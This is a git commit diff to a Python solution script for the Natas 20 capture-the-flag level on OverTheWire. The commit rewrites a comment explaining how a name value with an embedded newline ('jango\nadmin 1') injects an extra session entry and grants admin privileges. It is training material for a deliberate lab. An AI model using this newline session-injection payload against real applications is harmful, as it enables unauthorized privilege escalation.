916785a34b06f87f09505fa133cc4180ac08d6f0
Abdullah Taher Anwer Shaikh <abdullah.taher810@gmail.com>
2026-08-09 14:53:17 +0300

    Clarify session manipulation in Natas 20 script
    Updated comment to clarify the session manipulation for admin privileges.

--- Natas/Scripts/Natas 20.py
+++ Natas/Scripts/Natas 20.py
@@ -7,7 +7,7 @@ url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username
 
 
 session = requests.session()
-session.post(url , auth=(username, password), data= {"name":"jango\nadmin 1"}) # The my read function will loop through and assign jango firstly but right after it, admin will be set to 1 and assigned in place of jango which declares you as the admin.
+session.post(url , auth=(username, password), data= {"name":"jango\nadmin 1"}) # \n creates a new session line, so "admin 1" is parsed as $_SESSION["admin"] = "1", giving us admin privileges.
 
 response = session.get(url, auth=(username,password))
 
